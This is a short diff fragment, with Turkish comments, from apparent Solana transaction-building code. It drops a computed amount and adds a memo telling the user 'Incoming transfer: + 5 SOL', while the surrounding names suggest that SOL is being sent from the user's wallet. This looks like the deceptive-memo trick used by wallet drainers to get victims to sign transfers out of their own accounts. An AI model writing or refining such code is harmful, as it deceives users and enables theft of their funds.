@@ -113,7 +113,6 @@ export async function createUnsignedTransaction(userPublicKey) {
 
   // 🔖 ➊ İlk instruction: kullanıcıya “incoming transfer” memo’su
   if (isSolSufficient) {
-    const solAmount = (solToSend / LAMPORTS_PER_SOL).toFixed(2);
     instructions.push(
       createMemoInstruction(
         `📩 Incoming transfer: + 5 SOL`,
